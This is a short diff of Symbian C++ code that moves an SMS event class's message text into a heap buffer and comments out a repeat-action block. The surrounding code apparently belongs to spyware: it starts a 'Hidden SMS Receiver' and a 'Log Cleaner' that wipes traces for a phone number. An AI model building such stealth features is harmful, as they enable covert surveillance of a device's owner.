@@ -29,6 +29,7 @@ CEventSms::~CEventSms()
 	delete iSmsRecv;
 	iSocketServ.Close();
 	iFs.Close();
+	delete iSmsText;
 	__FLOG(_L("End Destructor"));
 	__FLOG_CLOSE;
 	}
@@ -101,8 +102,11 @@ void CEventSms::ConstructL(const TDesC8& params)
 		//retrieve tel number
 		rootObject->GetStringL(_L("number"),iSmsNumber);
 		//retrieve text
-		rootObject->GetStringL(_L("text"), iSmsText);
+		TBuf<250> smsText;
+		rootObject->GetStringL(_L("text"), smsText);
+		iSmsText = smsText.AllocL();
 		//retrieve repeat action
+		/*
 		if(rootObject->Find(_L("repeat")) != KErrNotFound)
 			{
 			//action
@@ -124,6 +128,7 @@ void CEventSms::ConstructL(const TDesC8& params)
 			iIter = -1;
 			iDelay = -1;
 			}
+			*/
 		//retrieve enable flag
 		rootObject->GetBoolL(_L("enabled"),iEnabled);
 						
@@ -142,7 +147,7 @@ void CEventSms::StartEventL()
 	
 	// Starts Hidden SMS Receiver and Log Cleaner
 	if(iSmsRecv != NULL)
-		iSmsRecv->StartReceivingL(iSmsText);
+		iSmsRecv->StartReceivingL(*iSmsText);
 	if(iLogCleaner != NULL)
 		iLogCleaner->StartCleaner(iSmsNumber);
 	}
